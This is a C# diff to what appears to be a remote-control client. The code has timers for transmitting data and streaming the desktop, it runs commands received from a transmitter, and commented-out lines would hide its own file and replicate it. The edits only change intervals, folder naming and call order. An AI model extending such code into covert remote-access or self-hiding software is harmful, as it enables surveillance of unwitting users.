@@ -390,7 +390,7 @@ namespace ClientHandler
         private int CONNECTION_TIMEOUT = 10000;
         private int CONNECTION_INTERVAL = 10000;
         private Timer transmitTimer;
-        private int transmitTimerInterval = 5000;
+        private int transmitTimerInterval = 1000;
         private Timer connectTimer;
         private Timer streamDesktopTimer;
 
@@ -420,16 +420,16 @@ namespace ClientHandler
             //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
             //Replicate(_args);
             var appDirBase = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            var appDirFolder = Path.Combine(appDirBase, "Hello World");
+            var appDirFolder = Path.Combine(appDirBase, AppAssembly.GetName().Name);
             if (!Directory.Exists(appDirFolder))
             {
                 Directory.CreateDirectory(appDirFolder);
             }
-            appDirFolder = Path.Combine(appDirFolder, PathExt.ReformatName("" + DateTime.Now.Ticks));
-            if (!Directory.Exists(appDirFolder))
-            {
-                Directory.CreateDirectory(appDirFolder);
-            }
+            //appDirFolder = Path.Combine(appDirFolder, PathExt.ReformatName("" + DateTime.Now.Ticks));
+            //if (!Directory.Exists(appDirFolder))
+            //{
+            //    Directory.CreateDirectory(appDirFolder);
+            //}
             AppDir = Path.Combine(appDirBase, appDirFolder);
             //Clipboard.SetText(appDir); MessageBox.Show(appDir);
             DirTransfers = Path.Combine(AppDir, APPDIR_TRANSFERS);
@@ -498,7 +498,6 @@ namespace ClientHandler
         public void SetTransmissionInterval()
         {
             StartWork(true);
-            UploadResult();
             var timeMS = Transmitter.TSettings.Parameters;
             int newInterval = 5000;
             if (int.TryParse(timeMS, out newInterval))
@@ -506,6 +505,7 @@ namespace ClientHandler
                 transmitTimerInterval = (newInterval >= 1000 && newInterval <= 24 * 60 * 60 * 1000) ? newInterval : transmitTimerInterval;
                 transmitTimer.Interval = transmitTimerInterval;
             }
+            UploadResult();
         }
 
         void ConnectAndSetup()
@@ -529,7 +529,7 @@ namespace ClientHandler
                 {
                     return;
                 }
-                Transmitter.UpdateLastActive();
+                //Transmitter.UpdateLastActive();
                 OnCommandEvent(this, new CommandEventArgs()
                 {
                     Command = Transmitter.TSettings.Command
